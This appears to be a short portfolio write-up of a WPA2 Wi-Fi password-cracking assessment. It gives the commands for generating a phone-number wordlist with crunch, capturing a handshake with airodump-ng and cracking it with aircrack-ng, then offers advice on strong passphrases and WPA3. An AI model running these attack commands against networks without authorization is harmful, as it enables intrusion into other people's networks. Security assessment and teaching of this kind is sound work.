# 🛡 Wireless Security Assessment: WPA2 Custom Dictionary Attack (Zain Iraq Format)

📌 Project Overview/ 
This project demonstrates a practical security assessment of a home WPA2 Wi-Fi network using a targeted dictionary attack. Instead of relying on generic
wordlists, a custom dictionary was generated based on local phone number patterns (Zain Iraq format: 11 digits starting with 078) to simulate a realistic localized
penetration testing scenario.

⚙️ Execution Phases & Methodology /
Phase 1: Custom Wordlist Generation (crunch)
Generating an exhaustive wordlist targeting Zain Iraq mobile numbers (11 digits starting with 078).

crunch
crunch 11 11 -t 078%%%%%%%% -o /home/kali/Desktop/zain_wordlist.txt

Phase 2: Adapter Preparation & Monitor Mode Activation
Configuring the wireless network adapter (wlan0) to enable Monitor Mode, allowing full packet capture across surrounding wireless channels.

ifconfig
sudo airmon-ng start wlan1
sudo airodump-ng wlan1

Phase 3: Capturing the WPA2 4-Way Handshake
Monitoring target AP traffic and capturing the EAPOL 4-Way Handshake during client re-authentication.

sudo airodump-ng --bssid  -c  -w handshake_capture wlan0mon

Phase 4: Offline Cracking using aircrack-ng
Performing an offline dictionary attack by matching the captured handshake file against the customized Zain Iraq wordlist to recover the network key.

aircrack-ng -w zain_wordlist.txt handshake_capture-01.cap


🔒 Security Recommendations...
Avoid Predictable Passphrases: Never use mobile phone numbers, national IDs, or sequential numbers as Wi-Fi passwords.

Use Strong Passphrases: Combine uppercase, lowercase, numbers, and special symbols with at least 12+ characters.

Upgrade to WPA3: Transition to WPA3-Personal which uses SAE (Simultaneous Authentication of Equals) to mitigate offline dictionary attacks.


👤 Author /
Name: Mustafa Layth Sabri
Certifications: CompTIA A+ | IBM IT Support Professional | CEH (In Progress)
